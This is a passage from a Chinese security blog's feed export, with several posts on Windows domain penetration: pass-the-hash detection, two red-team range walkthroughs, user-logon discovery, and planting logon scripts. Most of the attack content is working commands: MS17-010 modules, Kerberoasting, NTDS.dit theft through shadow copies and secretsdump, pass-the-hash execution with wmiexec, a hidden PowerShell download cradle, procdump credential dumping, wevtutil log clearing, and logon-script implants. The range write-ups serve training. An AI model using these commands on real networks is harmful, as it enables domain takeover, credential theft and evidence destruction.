4672 - 分配给新登录的特权 4769 - 请求了Kerberos服务票证 4672 - 分配给新登录的特权 4776 - 计算机尝试验证帐户的凭据 接下来看看【知识回顾】Pass The Hash所产生的日志事件 3）【知识回顾】Pass The Hash事件以下是我们在使用Pass-The-Hash执行NTLM身份验证时看到的日志摘要。 Source Host Target Host Domain Controller 4648 - 使用显式凭据尝试登录 4624 - 帐户已成功登录。登录类型3，NTLM 4776 - 计算机尝试验证帐户的凭据 4624 - 帐户已成功登录 （登录类型= 9 ,登录过程= Seclogo 4672 - 分配给新登录的特权 4672 - 分配给新登录的特权 （登录用户，而不是模拟用户） 自定义事件过滤器，可用于显示特定信息。 123456789101112131415161718192021&lt;QueryList&gt; &lt;Query Id="0" Path="Security"&gt; &lt;Select Path="Security"&gt; *[System[(EventID='4624')] and EventData[Data[@Name='LogonType']='9'] and EventData[Data[@Name='LogonProcessName']='seclogo'] and EventData[Data[@Name='AuthenticationPackageName']='Negotiate'] ] &lt;/Select&gt; &lt;/Query&gt; &lt;Query Id="0" Path="Microsoft-Windows-Sysmon/Operational"&gt; &lt;Select Path="Microsoft-Windows-Sysmon/Operational"&gt; *[System[(EventID=10)]] and *[EventData[Data[@Name='GrantedAccess'] and (Data='0x1010' or Data='0x1038')]]&lt;/Select&gt; &lt;/Query&gt;&lt;/QueryList&gt; 以上日志事件可自行验证。 VB代码为：&lt; https://docs.microsoft.com/en-us/previous-versions/bb671200%28v%3dvs.90%29&gt; 4) powershellhttps://github.com/cyberark/ketshash 5） 要想放心，还是得买买买StealthDEFEND Real-Time Auditing for Active Directory 略…. 6）蜜罐部署https://blog.stealthbits.com/detecting-pass-the-hash-honeypots/https://blog.stealthbits.com/implementing-detections-for-the-honeyhash/https://blog.stealthbits.com/deploying-pass-the-hash-honeypots/https://go.stealthbits.com/l/71852/2018-09-11/7vsk5x 略…. 0x04 缓解措施 域管账户只能访问域控制器，且强调最少用户访问的概念。 域控制器与其余敏感系统只能从可信的脱网环境进行访问。 使用双因素身份验证。 监控身份验证与异常登陆活动相关日志。 启用LSA保护。 手动添加注册表，取消明文存储（KB2871997补丁）： 1reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0 略…. 0x05 参考【知识回顾】Pass The Hash从hash传递攻击谈相关Windows安全机制Active Directory administrative tier model如何检测Windows中的横向渗透攻击HOW TO DETECT PASS-THE-HASH ATTACKSPass-the-hash attacks: Tools and Mitigation]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>系统安全</tag>
        <tag>内网渗透</tag>
        <tag>知识回顾</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【测试评估】内网练习（四）]]></title>
    <url>%2F2019%2F03%2F%E3%80%90%E6%B5%8B%E8%AF%95%E8%AF%84%E4%BC%B0%E3%80%91%E5%86%85%E7%BD%91%E7%BB%83%E4%B9%A0%EF%BC%88%E5%9B%9B%EF%BC%89%2F</url>
    <content type="text"><![CDATA[环境为模拟环境，文章使用的均为公开测试工具且未涉及到各个方法的原理。 分享便是我最好的老师。 ——Micropoor 0x00 前言在渗透测试中，经常会遇到一些奇奇怪怪的环境。本文所采用的环境是一个红蓝对抗靶场，以贴切实际环境为出发点。 目的：摸清整个内网拓扑图、获取域控内的flag文件及指定域用户手中的flag。 提示：flag{ooxx-ooxx} 初始网络拓扑 0x01 靶机信息收集因为是模拟环境，所以初始权限为win7域用户权限（上了RAT–&gt;http协议）。 DKRST011的基本信息 12345678910机器名: DKRST011权限: 域用户权限(rcoil\tk001)系统: Windows 7 Professional 6.1.7601 Service Pack 1 Build 7601 x64Domain: rcoil.localIP地址: 172.16.238.29杀软: McAfee(非最新版)补丁情况：[*240].NET版本：V1.0、V1.1、V2.0、V3.0、V3.5、V4.0已有操作: 密码拖取（需要未提权）、全盘文件列表获取、浏览器浏览记录及密码、TCP连接及进程等相关基础操作额为信息: 192.168.5.6:8080为内网代理服务 --&gt; Linux 在收集信息的时候发现TCP连接都是内网连接，而RAT的进程连接也是内网，感觉网络有问题。 探测出网情况：此机器为半脱网情况，dns、icmp、udp均不可出来，http与https协议可出网。所有出网程序连接均为192.10.22.6:8080，由此初步判断为代理出网情况，且是http无限制出网。 通过对带有password等关键字眼的文件进行搜索拖取，当作储备。 内网存活探测 12345- ICMP- SMB 172.16.88.0/16 192.168.5.0/16.... 0x02 对域内信息进行获取从全盘文件列表中可看到setspn是存在的，但是在我进行对域信息进行收集的时候发现已经没了（两个操作之间隔着一段时间）。为了方便操作（socks代理），所以使用Cobalt Strike上线操作。 1）问题（均为RAT上运行） Cobalt Strike免杀问题； powerview运行无反应（powershell、C#）； Bloodhound/Sharphou运行无反应； setspn.exe 被删除。 2）方案 免杀shellcode，使用加载器运行，例子 ； Cobalt Strike的execute-assembly运行本地相应C#程序； 使用GetUserSPNs 替换setspn使用；1python GetUserSPNs.py -request -dc-ip 192.10.22.22 pentestlab.com/rcoil 3）域信息的收集结果大致如下1234567域控： TTT-2_172.16.88.21_windows 2016 x64 (主域控) TTT-V_172.16.88.20_windows 2016 x64 (辅助域控) 域管理员：10+域用户：200+域内机器：150+其他：略.... 0x03 域控（域管理员）权限获取方法按照当前权限，梳理出一些知识点，大概可支持当前应用（知识串联）。 1） 常规方法及结果 组策略漏洞（GPP）–&gt; （MS14-025） 1234567方法： enum4linux -a -u tk001 -p P@ssw0rd 172.16.88.21 (数据收集) smbclient //172.16.88.21/SYSVOL -U tk001 或者使用msf auxiliary/scanner/smb/smb_enum_gpp[*] 结果： 失败（其实单单看是2016 server系统就知道不会成功） MS17-010 12345678[*]msf auxiliary/admin/smb/ms17_010_command auxiliary/scanner/smb/smb_ms17_010 exploit/windows/smb/ms17_010_eternalblue exploit/windows/smb/ms17_010_eternalblue_win8 exploit/windows/smb/ms17_010_psexec[*] 结果： TTT-V_172.16.88.20成功执行命令 Kerberoasting 1234567[*]GetUserSPNs.py python GetUserSPNs.py -request -dc-ip 192.10.22.22 pentestlab.com/rcoil 关闭Kerberos预身份认证[*]Rubeus --&gt; https://github.com/GhostPack/Rubeus Rubeus.exe asreproast # 枚举所有域用户（或者指定）Roasting AS-REPs[*] 结果: 失败 2） 主流方法及结果 基于资源约束委派(RBCD) –&gt; （未尝试） 123456[*] 条件：2012+域控制器[*] powermad[*] powerview[*] Rubeus[*] SharpAllowedToAct https://github.com/pkb1s/SharpAllowedToAct NTLM中继攻击（未尝试） 12345678[*] Responder windows版本：https://github.com/Kevin-Robertson/Inveigh（修改函数名绕杀软等方法） linux版本：https://github.com/SpiderLabs/Responder[*] mitm6+ntlmrelayx https://github.com/fox-it/mitm6 https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py[*] CrackMapExec https://github.com/byt3bl33d3r/CrackMapExec Exchange （未启用Exchange） 1234567[*] Privexchange privexchange.py -ah 172.16.238.29 TTT-2.rcoil.local -u tk001 -d rcoil.local -p P@ssw0rd # Privexchange.py对echange进行API调用 ntlmrelayx.py -t ldap://172.16.88.21 --escalate-user tk001 # ntlmrelayx将Exchange服务器的凭据中继到主DC，然后升级tk001的权限 secretsdump.py rcoil/tk001@TTT-2.rcoil.local -just-dc[*] Exchange2domain --&gt; 一体化的privexchange工具 https://github.com/Ridter/Exchange2domain 3） 辅助工具 BloodHound –&gt; 映射出活动目录关系 ADAPE-Script –&gt; AD评估和权限提升脚本 Invoke-PsUACme –&gt; 绕过UAC CrackMapExec –&gt; 查找特权帐户等等等利用 SILENTTRINITY –&gt; 后期利用 …. 除了以上这些点，还有很多方法，最无脑的就是查看当前用户具有读权限的域内所有共享，信息收集，翻一轮、 123[*] powerviewFind-DomainShare -CheckShareAccess | fl | Out-File domain-shares.txt[*] 略.... 0x04 域控权限TTT-V_172.16.88.20使用MS17-010成功执行命令。 域控信息： 123456789101112机器名: TTT-V权限: 域控权限系统: Windows Server 2016 Standard 10.0.14393 N/A Build 14393 x64OS Configuration: Additional/Backup Domain ControllerDomain: rcoil.localIP地址: 172.16.88.20杀软: McAfee(非最新版)补丁情况：[*2].NET版本：V1.0、V1.1、V2.0、V3.0、V3.5、V4.0端口情况：无Web --&gt; TTT-2_172.16.88.21存在80端口IIS服务域信任关系：rcoil.local（root） demo.rcoil.local 往下的思路是这样的： 123[*] 本机flag获取[*] 在TTT-V机器上拖取NTDS.dit文件，本地恢复获取域内所有用户hash。当然，能获取到明文是最好的。[*] 使用CrackMapExec、wmiexec等工具执行相关操作（重点：以域管权限启动CS，后使用PTH攻击 --&gt; 简直完美）。 1）实施 flag获取 123456[*] dir dir /s flag[*] powerview(可选) Invoke-Filefinder -Threads 100 -Verbose -Terms flag -IncludeC -OutFile C:\Windows\Temp\flags.txt flag&#123;Genius_only_means_hard-working_all_one's_life&#125; 直接反弹MS17-010的shell进行操作 12bind_tcp --&gt; 失败bind_pipe --&gt; 失败 IPC操作 1234[*] 不建议之操作 添加添加系统隐藏账号密码进行IPC一系列操作[*] 域管权限 直接从域控IPC到DKRST011进行工具复制 --&gt; 拒绝访问 NTDS.dit 12345678910vssadmin create shadow /for=c: copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\NTDS\NTDS.dit c:\windows\temp\ntds.dit copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\SYSTEM c:\windows\temp\system.hivevssadmin delete shadows /shadow=&#123;1xxxxx0b-e47d-xxxx-969f-8xxa4xxxx0xx&#125; /quiet最后通过 //172.16.88.21/SYSVOL 拖到 DKRST011 机器，本地恢复python secretsdump.py -ntds /root/ntds.dit -system /root/SYSTEM LOCAL域管理员的password为hash格式。后使用 CrackMapExec、wmiexec等工具进行进一步测试。 注：调用Volume Shadow Copy服务会产生日志文件，位于System下，Event ID为7036 2）遇到问题执行以下命令：1wmiexec.py -hashes LMHASH:NTHASH rcoil/administrator@172.16.238.29 "c:\\payload.exe" Cobalt Strike未上线，这个情况其实是第一次见。 以多种形式的payload运行也无果。 确认非协议问题，因为以同样的程序，在域用户权限下正常启动并上线。 3）方案 获取明文密码，计划任务启动； 添加HKLM自启注册表 0x05 获取域管明文密码使用powerview查询域管登陆过的机器：123# Find-DomainUserLocation == old Invoke-UserHunter# enumerate servers that allow unconstrained Kerberos delegation and show all users logged inFind-DomainUserLocation -ComputerUnconstrained -ShowAll 最后选择了172.16.10.29的win 2008 server的机器，而且这台机器上存在AdAudit Plus。 由于目前没有任何容器可提供文件传输，所以自建。 在DKRST011机器创建FTP或者Web服务； 12345678910111213141516import SimpleHTTPServerimport SocketServerimport sysPORT = 80if len(sys.argv) != 2: print("use: web.exe port")else: PORT = int(sys.argv[1]) Handler = SimpleHTTPServer.SimpleHTTPRequestHandler httpd = SocketServer.TCPServer(("", PORT), Handler) print "SimpleHTTPServer is ", PORT print "by k8gege" httpd.serve_forever()来源：https://raw.githubusercontent.com/k8gege/K8tools/master/web.py 注：这类型操作也需要添加防火墙规则，防止弹窗netsh advfirewall firewall add rule name="web.exe" dir=in program="c:\Users\Public\Downloads\web.exe" action=allow 使用certutil、bitsadmin、powersehll等自带程序下载； 123[*] certutil -urlcache -split -f http://172.16.238.29/1.rar 2.rar[*] bitsadmin /rawreturn /transfer 任务名 http://172.16.238.29/1.rar 2.rar[*] powershell -WindowStyle Hidden "IEX (New-Object Net.WebClient).DownloadFile('http://172.16.238.29/1.rar','c:\windows\temp\ 2.rar')" 这里有人就会问了，为什么不将需要使用的东西放入到域共享目录里面，原因是要操作的机器访问域共享提示无法访问。 往下就是Procdump的一些操作，成功获取到明文密码。 1234[*] 高权限计划任务启动CS服务端，未上线。[*] 添加HKLM自启动，未上线。这是什么问题呢？（未解决） 0x05 其余flag获取从提示与目的来判断，剩下的2个flag位于demo.rcoil.local域的域控、域用户名为flagav的机器上。 flagav用户机器直接从AdAudit Plus获取到域用户flagav的登陆情况，这样就不用去翻日志了。使用CrackMapExec、wmiexec等工具执行命令查找flag： 1flag&#123;Cease_to_struggle_and_you_cease_to_live&#125; 子域域控flag 使用主域控的域管可直接登陆子域的域控 1flag&#123;Success_grows_out_of_struggles_to_overcome_difficulties&#125; 0x0x 最后的拓扑好多没去了解，就草草结束了。 免责声明：文章中所提到的工具/教程，不得用于商业或非法用途，否则后果自负。]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
        <tag>测试评估</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【测试评估】内网练习（三）]]></title>
    <url>%2F2019%2F01%2F%E3%80%90%E6%B5%8B%E8%AF%95%E8%AF%84%E4%BC%B0%E3%80%91%E5%86%85%E7%BD%91%E7%BB%83%E4%B9%A0%EF%BC%88%E4%B8%89%EF%BC%89%2F</url>
    <content type="text"><![CDATA[文章已脱敏，为了方便理解，IP未处理。 0x00 前言在渗透测试中，经常会遇到一些奇奇怪怪的环境。本文所采用的环境是一个红蓝对抗靶场，以贴切实际环境为出发点。 目的：查找内网中找到R9部门中关键字为flag_yinquesiting_rcoil的文件（文档、数据库不限）。 提示：域用户备注存在部门名称。 初始网络拓扑 0x01 靶机信息收集入口点是工作组内普通的一台win7系统权限（可出外网 –&gt; AttackVPS），上线Cobalt Strike（使用https协议）进行操作。 M238-RcoIl的基本信息。 12345678机器名: M238-RcoIl权限: system权限系统: Windows 7 Professional 6.1.7601 Service Pack 1 Build 7601 x64Domain: WORKGROUPIP地址: 10.20.238.29 （此C段纯工作组）杀软: Panda Endpoint Protection、McAfee、SMADAV (非最新版)已有操作: 密码拖取、全盘文件列表获取、浏览器浏览记录及密码、TCP连接及进程等相关基础操作额为信息: 10.1.1.0/24 注：操作存在未成功状态。在操作时发现此靶机的流量明显受阻，初步研判是存在类似流量审计的系统。 在TCP连接及浏览器浏览记录中发现了一些内网IP，做记录。其余未发现有任何敏感信息，故此机器仅作跳板机即可。 由此机器（M238-RcoIl）作为A跳板，通过Socks4代理对所处网络C段进行常规的端口探测（Web、SMB、SSH、FTP、SMTP等），最后通过MS-17-010获取到10.20.238.12机器权限，上线Cobalt Strike进行操作。 重复信息收集步骤 12345678机器名: Admin-RcoIl权限: system权限系统: Windows Vista Business 6.0.6000 N/A Build 6000 x86Domain: WORKGROUPIP地址: 10.20.238.12 （此C段纯工作组）杀软: Panda Endpoint Protection、SMADAV (非最新版)已有操作: 密码拖取、全盘文件列表获取、浏览器浏览记录及密码、TCP连接及进程等相关基础操作额为信息: 10.1.1.0/24 注：操作存在未成功状态。 从信息收集情况来看，此机器仅多了几个内网连接，但这一台机器的网络环境比A跳板机好很多。故，由此机器作为B跳板机，同样是使用Socks4。 此时网路拓扑为： 0x02 内网拓展 一由于搭建的B跳板机网络较好，所以使用B跳板机。 对10.1.1.0/24进行常规的端口探测 12345SMB: 探测无结果Web: 利用点最好选为初始环境（默认配置） --&gt;http://10.1.1.133/rcoil/main/index.php RcoIl的窝-许可证注册管理系统 --&gt;http://10.1.1.91 Tomcat管理页面其余情况: 无 一、web默认配置10.1.1.133这个web是默认配置（非CMS），并且存在phpmyadmin，尝试弱口令 –&gt; 进入后台 –&gt; 写入shell –&gt; 蚁剑连接 –&gt; 成功、系统权限（这就是默认配置的魅力 –&gt; 简洁快速）。 12345678机器名: WIN-B001权限: system权限系统: Windows Server 2008 Standard 6.0.06002 Service Pack 2 x64Domain: WORKGROUPIP地址: 10.1.1.133 （此C段存在域）杀软: 无已有操作: 密码拖取、全盘文件列表获取、浏览器浏览记录及密码、数据库帐密及数据库内容、TCP连接及进程等相关基础操作额外信息: TCP未存在已连接IP 查看TCP连接，未发现任何的连接情况。上线Cobalt Strike未成功，此时查看连接，发现靶机与AttackVPS处于SYN-SENT状态，没有访问成功？经过探测，确定是出不来的状态，最后使用smb协议上线。 从它数据库中获取了一些密码，但感觉会没有作用，因为都是一些弱智密码。 二、Tomcat默认配置Tomcat是默认密码，部署war拿到系统权限，但是由于是jsp，蚁剑不支持，所以使用菜刀连接。 12345678机器名: PG-BUK权限: system权限系统: Windows Server 2008 R2 Standard 6.1.7601 Service Pack 1 Build 7601 x64Domain: demo.rcoil.meIP地址: 10.1.1.91 （此C段存在域）杀软: Panda Security (非最新版)已有操作: 密码拖取、全盘文件列表获取、浏览器浏览记录及密码、数据库帐密及数据库内容、TCP连接及进程等相关基础操作额外信息: 此机器8080端口为Apache服务 在此机器上获取到了域管理员帐密（DEMO\Administrator/test@demo02），但是在此机器上获取不到别的域信息，报出1355错误。powerview运行报错。 8080端口是一个端点资产管理系统，使用的是xampp。 查看量数，不得了，15K的量，这数据也是伪造得够狠的，分不清哪些是真是假，能不能通往。 查看数据库，是站库分离的，数据库在10.1.1.16，使用的是mssql，开启xp_cmdshell。 三、数据库12345678机器名: DCO-DB权限: 网络权限系统: Windows Server 2008 R2 Standard 6.1.7601 Service Pack 1 x64Domain: demo.rcoil.meIP地址: 10.1.1.16 （此C段存在域）杀软: Panda Security、Symantec (非最新版)已有操作: TCP连接及进程等相关基础操作额外信息: 使用获取的域管账号登陆失败、查询域内信息1355报错 四、SPNSPN：“服务主体名称(SPN)是由客户端对一个服务实例进行唯一标识的名称”。这意味着安装到Windows域中的每个服务都会被注册到活动目 录(Active Directory)中。 1setspn -T demo.rcoil.me -Q */* 使用这个对于信息收集也很快速。但是这里出现错误 12345Ldap Error(0x51 -- Server Down): ldap_connectFailed to retrieve DN for domain "demo.rcoil.me" : 0x00000051Warning: No valid targets specified, reverting to current domain.Ldap Error(0x51 -- Server Down): ldap_connectError occured when searching for existing SPN: 0x00000051 0x03 内网拓展 二一、SMB协议WIN-B001机器作为C跳板机。 进行C段SMB识别，发现是可以探测出来版本等信息。因此可知，B跳板机的网段是被做了些隔离限制。 先大概摸清网络拓扑，接下来进行以下操作： 从资产管理系统抽取IP段； 对抽取的IP段进行SMB信息探测，但可能会有隔离等策略限制； 使用MS-17-010配合进行漏洞检测； MS-17-010的漏洞作用为添加隐藏账号 最后共计有226台机器检测出存在漏洞。从筛选SMB信息探测结果来看，此机器可到达内网域有6个。看了看数据，总感觉漏了东西，如果这些信息没有帮助的话，就对10.0.0.0/8进行全面识别了。 二、SMB协议利用使用Cobalt Strike批量测试上线外网情况，有一台（NSVC-001_10.160.5.51）机器成功上线。并且这台机器没有任何的杀软限制（后续因忽略了流量审计系统的问题，掉线），接下来的操作都是基于这台机器做的D跳板。 使用NSVC-001_10.160.5.51作为根beacon，smb协议上线PG-BUK_10.1.1.91。 从探测结果选择一个域名为ba.demo.me且存在MS-17-010漏洞的机器，从PG-BUK_10.1.1.91使用smb协议上线BA-AS02_10.0.1.34 三、ba.demo.me域12345678机器名: BA-AS02权限: system权限系统: Windows Server 2008 R2 Standard x64 备份域控Domain: ba.demo.meIP地址: 10.0.1.34杀软: 无已有操作: 密码拖取、全盘文件列表获取、浏览器浏览记录及密码、TCP连接及进程等相关基础操作额外信息: 获取到域管理员账号密码、域信任关系 从这一台机器上面的信息可疑判断，这个靶场环境是存在PacketShaper，非常的贴切。 1234567891011121314151617181920# 查看域控制器c:\Users\Public\Downloads&gt; nltest /dclist:ba.demo.meGet list of DCs in domain 'ba.demo.me' from '\\BA-AS02.ba.demo.me'. BA-AS02.ba.demo.me [DS] Site: Default-First-Site-Name BA-AM02.ba.demo.me [DS] Site: Default-First-Site-Name BA-AS01.ba.demo.me [PDC] [DS] Site: Default-First-Site-NameThe command completed successfully# 查看域信任关系c:\Users\Public\Downloads&gt; nltest /domain_trustsList of domain trusts: 0: PH ph.ba.demo.me (NT 5) (Direct Outbound) (Direct Inbound) 1: SH sh.ba.demo.me (NT 5) (Direct Outbound) (Direct Inbound) 2: KL kl.ba.demo.me (NT 5) (Direct Outbound) (Direct Inbound) 3: KD kd.ba.demo.me (NT 5) (Direct Outbound) (Direct Inbound) 4: SW sw.ba.demo.me (NT 5) (Direct Outbound) (Direct Inbound) 5: PS ps.ba.demo.me (NT 5) (Direct Outbound) (Direct Inbound) ( Attr: quarantined ) 6: BA ba.demo.me (NT 5) (Forest Tree Root) (Primary Domain) (Native)The command completed successfully不得了，居然有子域，而且目前位置是在根域。 其实这一台机器上面的web服务也是默认的xampp，但是phpmyadmin只允许本地访问，而且首页做了跳转。 在对BA-AS02_10.0.1.34进行信息收集时，D跳板机断开连接，经初步研判，应该是管理员对机器进行了维护。所以使用B跳板机继续操作。 此域存在200+用户，并未发现关键词。利用SPN识别域内的SQL服务，并未发现，故放弃此域。 接下来往其他域着手。 0x0x 最后的思维导图]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
        <tag>测试评估</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【域渗透】获取域环境内用户登录信息]]></title>
    <url>%2F2018%2F11%2F%E3%80%90%E5%9F%9F%E6%B8%97%E9%80%8F%E3%80%91%E8%8E%B7%E5%8F%96%E5%9F%9F%E7%8E%AF%E5%A2%83%E5%86%85%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E4%BF%A1%E6%81%AF%2F</url>
    <content type="text"><![CDATA[之前见到有人在讨论域内用户在域内的机器ip怎么查呢，集思广益，结合答复及自己的观点，总结了以下内容。 0x00 adfind有时候管理员会设置域用户只可以登录指定的的域内计算机，使用 adfind或者 powerview导出域用户信息可以查看；12345678查看域内用户详细信息：adfind.exe -h DNS_SERVER_IP -sc u:rcoil(目标用户)adfind.exe -h DNS_SERVER_IP -sc u:rcoil | findstr userWorkstations //非域权限执行需要指定账户密码查看域内所有用户详细信息：AdFind.exe -h DNS_SERVER_IP -sc u:*详见：http://www.joeware.net/freetools/tools/adfind/usage.htm powerview在域内执行就可以。 123Get-NetUser -Domain demo.rcoil.me //domain参数请加完整的域名或Invoke-EnumerateLocalAdmin 0x01 查看域内机器的用户目录文件夹确定开机状态的计算机列表-建立连接-查看用户目录-断开连接，可以参考如下批处理：123456789for /f "delims=" %%i in (live.txt) DO ( net use \\%%i\C$ password /u:domain\domain_admins_user if not errorlevel 1 ( for /f "delims=" %%j in ('dir /od /b \\%%i\C$\users\') do ( echo %%i:%%j&gt;&gt; test.log ) net use \\%%i\C$ /del )) 域管不用建立连接就可以访问域内计算机资源，因此以域管权限运行时可以参考如下批处理：12345for /f "delims=" %%i in (live.txt) DO ( for /f "delims=" %%j in ('dir /od /b \\%%i\C$\users\') do ( echo %%i:%%j&gt;&gt; test.log )) 代码补充：NetWorkConnectIPC 0x02 域控日志wevtutil为Windows 事件命令行实用程序，其导出的日志为evtx格式（即Windows日志本身的存储格式），可以使用Windows事件查看器分析，Crtl+F查找，或者不使用epl参数，直接重定向输出即可。wevtutil常用的场景是清理日志。1234wevtutil cl applicationwevtutil cl securitywevtutil cl systemwevtutil cl "windows powershell" 而它也可作为筛选分析日志的工具。这里需要注意的几个ID分别为：4624（用户登陆成功）、4768、4776（用户账号验证成功） 使用wevtutil结合python wevtutil 1wevtutil qe security /q:"Event[System[(EventID=4624 or EventID=4768 or EventID=4776)]]" /f:text /rd:true /c:1 &gt; EvtLogon.dat 参数说明 1234567qe: 从日志或日志文件中查询事件；（默认xml格式显示）Security: 指定安全事件的日志；/q: 筛选规则，可以打开Windows事件查看器的筛选器配置筛选条件后转至XML复制筛选规则；/f: 以text格式显示/rd: 指定读取事件的方向/c: 指定个数该命令其它参数参考wevtutil /? python 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556# -- coding:utf-8 --# Python v2.7.10import sysimport csvevt = 'EvtLogon.dat'fevt = open(evt,'r')try: # For Eliminate redundancies lastdate = 'lastdate' lasttask = 'lasttask' # 因为windows下的换行符问题，导致写的文件会有空行，使用二进制模式打开 with open('LogonStat.csv', 'wb') as csvfile: csv_write = csv.writer(csvfile) csv_write.writerow(["Task", "Date", "Account Name", "Account Domain", "Logon Address"]) for eachline in fevt: if eachline.find('Event[') &gt; -1: task = '' date = '' accname = '' logontype = '' logonaddr = '' skip = 0 elif eachline.find('Date:') &gt; -1: date = eachline[(eachline.find(':')+1):].strip() elif eachline.find('Task:') &gt; -1: task = eachline.split(':')[1].strip() if (date == lastdate) and (task == lasttask): ## reduce skip = 1 else: lastdate = date lasttask = task elif eachline.find('Account Name:') &gt; -1: accname = eachline.split(':')[1].strip() if (task == 'Logon') and (accname.find('$') &gt; -1): ## reduce skip = 1 elif eachline.find('Account Domain:') &gt; -1: accdomain = eachline.split(':')[1].strip() elif eachline.find('Source Network Address:') &gt; -1: logonaddr = eachline[(eachline.find(':')+1):].strip() if logonaddr == '-': skip = 1 if (skip == 0) and (task == 'Logon'): LogonStat = [[task, date, accname, accdomain, logonaddr]] csv_write.writerows(LogonStat)except Exception as e: # pass print 'Error: %s' % e sys.exit(1)fevt.close()csvfile.close() PS: 筛选条件还有很多，都可以组合利用，从而筛选出自己所需要的信息。123wevtutil qe Security /q:"*[EventData[Data[@Name='LogonType']='10'] and EventData[Data[@Name='TargetUserName']='RcoIl'] and System[(EventID=4624) and TimeCreated[timediff(@SystemTime) &amp;lt;= 2592000000]]]"wevtutil qe Security /q:"*[System[(Keywords='0x8020000000000000')] and EventData[Data[@Name='SubjectUserName']='RcoIl']]" /f:text /rd:true /c:2 0x03 DNS解析记录12dnscmd 127.0.0.1 /enumrecords demo.rcoil.me demo.rcoil.me. /type A //利用dnscmd导出dns正向解析记录dnscmd 127.0.0.1 /zoneprint demo.rcoil.me &gt;1.txt C# .NET 编写的工具 SharpADDNSDump 0x04 Exchange 日志4.1 Outlook Web Applicationowa 默认的登陆日志位置如下： 1C:\inetpub\logs\LogFiles\W3SVC1（W3SVC2） 日志是根据时间（天）¬为单位进行分割的，比如 u_ex190426 就表示 19 年 4 月 26 号那一天的日志。 在实战中，可根据自己的实际需求，把指定时间段内的日志想办法拖回来即可。 部分内容如下： 12019-04-26 06:49:51 192.10.20.200 POST /owa/auth.owa &amp;CorrelationID=&lt;empty&gt;;&amp;ClientId=KFTFMZBXS0ATOXTCCJLOQ&amp;cafeReqId=c3db90a9-02e3-4fd0-8633-05fb7799f4fd; 443 rcoil.me\pentest 192.10.20.104 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/73.0.3683.103+Safari/537.36 https://exchange/owa/auth/logon.aspx?replaceCurrent=1&amp;url=https%3a%2f%2fexchange%2fowa 302 0 0 31 此时我们需要的内容单单为：rcoil.me\pentest 192.10.20.104，其他数据可不理会。 4.2 Outlook 客户端Outlook 客户端登陆的默认日志文件如下： 1C:\Program Files\Microsoft\Exchange Server\V14\Logging\RPC Client Access 0x05【参考】wevtutil筛选windows日志查询结果[Tools]获取域环境内所有用户登录信息（附源码及程序）域内用户在域内的机器ip怎么查呢？https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/dd337721(v%3dws.10)https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc732848(v=ws.11)]]></content>
      <categories>
        <category>编程之道</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
        <tag>域渗透</tag>
        <tag>C#</tag>
        <tag>Tools</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【域渗透】在域控上使用cmd更改域用户配置文件中的登录脚本]]></title>
    <url>%2F2018%2F11%2F%E3%80%90%E5%9F%9F%E6%B8%97%E9%80%8F%E3%80%91%E5%9C%A8%E5%9F%9F%E6%8E%A7%E4%B8%8A%E4%BD%BF%E7%94%A8cmd%E6%9B%B4%E6%94%B9%E5%9F%9F%E7%94%A8%E6%88%B7%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E4%B8%AD%E7%9A%84%E7%99%BB%E5%BD%95%E8%84%9A%E6%9C%AC%2F</url>
    <content type="text"><![CDATA[摘要：采取直接的手段不能够解决问题，只好曲线救国。声明：只是作为搬运工。 0x00 利用场景 利用前置条件 1域管理员权限 使用场合 12知道目标域用户名称，探测不到域用户对应机器名或IP；知道目标机器IP，但是无法通往上控； 0x01 利用方法PS：以下测试全部在域控上执行 一）使用dsmod给指定域用户设置登陆脚本test.bat放在域控的NETLOGON目录下面12copy test.bat \\域控\SYSVOL\sysvol\域名\SCRIPTS\test.batdsmod user -loscr "test.bat" "CN=x,OU=x,DC=x,DC=x,DC=x" 测试结果：PS: 测试机为Win-XP x86，第二次注销重新登陆bat脚本才执行，bat内容为`@calc.exe`。 二）登陆脚本给指定用户种马test.bat放在域控的NETLOGON目录下面123copy test.bat \\域控\SYSVOL\sysvol\域名\SCRIPTS\test.batnet user xp /scriptpath:test.bat # 内网域成员机器可以使用gpupdate /force # 立即刷新组策略 使用域管权限执行 不执行也行,等待随机 测试结果与第一种方法一致 三）使用PowerShell的Active Directory模块ActiveDirectory.psd1项目：ADModule命令：12Import-Module ActiveDirectory.psd1; 或者Import-Module Microsoft.ActiveDirectory.Management.dllSet-ADUser -Identity AD_USER -ProfilePath "filepath" -ScriptPath "filename" 参数说明 Identity通过提供以下属性值之一指定Active Directory用户对象。括号中的标识符是属性的LDAP显示名称。此参数的可接受值为： 1234一个名字GUID（objectGUID）安全标识符（objectSid）SAM帐户名称（sAMAccountName） ProfilePath指定用户配置文件的路径。该值可以是本地绝对路径或通用命名约定（UNC）路径。 ScriptPath指定用户登录脚本的路径。该值可以是本地绝对路径或通用命名约定（UNC）路径。 测试结果与第一种方法一致 0x02 参考http://cate4cafe.com/2018/11/17/%E8%AE%BE%E7%BD%AE%E5%9F%9F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E8%84%9A%E6%9C%AC/https://www.t00ls.net/thread-48540-1-1.htmlhttps://www.labofapenetrationtester.com/2018/10/domain-enumeration-from-PowerShell-CLM.htmlhttps://docs.microsoft.com/en-us/powershell/module/addsadministration/Set-ADUser?view=win10-ps]]></content>
